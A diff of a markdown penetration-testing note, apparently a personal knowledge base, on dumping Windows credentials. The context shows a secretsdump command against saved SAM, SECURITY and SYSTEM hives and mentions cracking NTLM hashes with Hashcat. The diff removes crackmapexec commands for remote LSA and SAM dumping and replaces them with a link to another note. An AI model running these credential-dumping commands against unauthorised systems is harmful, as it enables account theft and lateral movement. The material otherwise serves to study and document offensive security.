@@ -163,13 +163,7 @@ $ secretsdump -sam sam.save -security security.save -system system.save LOCAL
 
 We can then use a tool like [[Hashcat]] to offline crack the NT (*NTLM*) or LM hashes that have been dumped.
 
-**Remote dumping** of the LSA secrets & SAM databases can also be done via tools like `crackmapexec` using a local administrator account:
-```sh
-$ crackmapexec smb [ip] --local-auth -u [user] -p [pass] --lsa
-
-$ crackmapexec smb [ip] --local-auth -u [user] -p [pass] --sam
-```
-
+![[CrackMapExec#Extracting Hashes from SAM Database]]
 ### Attacking LSASS
 > Ref: [[Windows#LSASS]]
 
